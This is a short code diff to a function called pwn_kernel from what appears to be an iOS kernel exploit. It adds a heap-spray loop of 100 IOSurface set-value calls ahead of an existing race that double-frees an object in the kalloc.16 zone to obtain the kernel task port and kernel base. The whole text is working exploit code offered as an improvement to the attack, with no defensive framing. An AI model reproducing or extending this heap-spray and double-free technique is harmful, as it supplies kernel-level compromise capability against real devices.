@@ -439,6 +439,26 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint32_t spray_dictsz = 0x0, dummy = 0x0;
     size = sizeof(dummy);
     
+    LOG("pre-spraying...");
+
+    // always pre-spray, kids
+    for (int i = 0; i < 100; i++)
+    {
+        uint32_t spray_dictsz = 0;
+        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);
+
+        uint32_t dummy = 0;
+        size = sizeof(dummy);
+        ret = IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
+
+        if (ret != KERN_SUCCESS)
+        {
+            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
+            ret = KERN_FAILURE;
+            goto out;
+        }
+    }
+
     LOG("spraying ports & racing...");
     
     // this will try to double free an obj as long as the second dword of it will be zero, obj is alloced in kalloc.16
